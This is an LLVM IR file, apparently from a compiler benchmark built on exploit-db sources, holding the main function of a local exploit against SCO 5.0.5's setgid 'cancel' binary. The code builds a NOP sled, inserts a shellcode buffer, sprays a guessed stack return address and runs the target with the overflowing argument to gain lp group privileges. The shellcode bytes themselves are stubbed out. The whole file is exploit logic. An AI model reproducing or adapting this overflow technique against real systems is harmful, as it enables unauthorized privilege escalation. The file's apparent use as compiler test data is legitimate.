; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19543.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_19543.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"Error: Usage: %s offset buffer\0A\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"\0ASCO 5.0.5 cancel exploit yields egid=18(lp)\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"Brock Tellier btellier@webley.com\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"Using addr: 0x%x\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@scoshell = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [53 x i8] c"/opt/K/SCO/Unix/5.0.5Eb/.softmgmt/var/usr/bin/cancel\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"cancel\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %6, align 8
  %12 = load i32, i32* @LEN, align 4
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* @LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %10, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %11, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 3
  br i1 %18, label %19, label %26

19:                                               ; preds = %2
  %20 = load i32, i32* @stderr, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %23)
  %25 = call i32 @exit(i32 0) #4
  unreachable

26:                                               ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, 2
  br i1 %28, label %29, label %35

29:                                               ; preds = %26
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @atoi(i8* %32)
  %34 = ptrtoint i8* %33 to i64
  store i64 %34, i64* %6, align 8
  br label %51

35:                                               ; preds = %26
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, 3
  br i1 %37, label %38, label %49

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i8* @atoi(i8* %41)
  %43 = ptrtoint i8* %42 to i64
  store i64 %43, i64* %6, align 8
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 2
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @atoi(i8* %46)
  %48 = ptrtoint i8* %47 to i32
  store i32 %48, i32* %8, align 4
  br label %50

49:                                               ; preds = %35
  store i64 600, i64* %6, align 8
  store i32 1200, i32* %8, align 4
  br label %50

50:                                               ; preds = %49, %38
  br label %51

51:                                               ; preds = %50, %29
  br label %52

52:                                               ; preds = %51
  %53 = call i64 (...) @get_sp()
  store i64 %53, i64* %9, align 8
  %54 = load i32, i32* @stderr, align 4
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %54, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %58 = load i32, i32* @stderr, align 4
  %59 = load i64, i64* %9, align 8
  %60 = load i64, i64* %6, align 8
  %61 = add nsw i64 %59, %60
  %62 = call i32 (i32, i8*, ...) @fprintf(i32 %58, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i64 %61)
  %63 = load i32, i32* @NOP, align 4
  %64 = load i32, i32* %8, align 4
  %65 = call i32 @memset(i8* %16, i32 %63, i32 %64)
  %66 = load i32, i32* %8, align 4
  %67 = sdiv i32 %66, 2
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %16, i64 %68
  %70 = load i32, i32* @scoshell, align 4
  %71 = load i32, i32* @scoshell, align 4
  %72 = call i32 @strlen(i32 %71)
  %73 = call i32 @memcpy(i8* %69, i32 %70, i32 %72)
  %74 = load i32, i32* %8, align 4
  %75 = sdiv i32 %74, 2
  %76 = load i32, i32* @scoshell, align 4
  %77 = call i32 @strlen(i32 %76)
  %78 = add nsw i32 %75, %77
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %7, align 4
  br label %80

80:                                               ; preds = %94, %52
  %81 = load i32, i32* %7, align 4
  %82 = load i32, i32* %8, align 4
  %83 = sub nsw i32 %82, 4
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %97

85:                                               ; preds = %80
  %86 = load i64, i64* %9, align 8
  %87 = load i64, i64* %6, align 8
  %88 = add nsw i64 %86, %87
  %89 = trunc i64 %88 to i32
  %90 = load i32, i32* %7, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %16, i64 %91
  %93 = bitcast i8* %92 to i32*
  store i32 %89, i32* %93, align 1
  br label %94

94:                                               ; preds = %85
  %95 = load i32, i32* %7, align 4
  %96 = add nsw i32 %95, 4
  store i32 %96, i32* %7, align 4
  br label %80

97:                                               ; preds = %80
  %98 = call i32 @execl(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0), i8* %16, i32* null)
  %99 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i8* @atoi(i8*) #2

declare dso_local i64 @get_sp(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
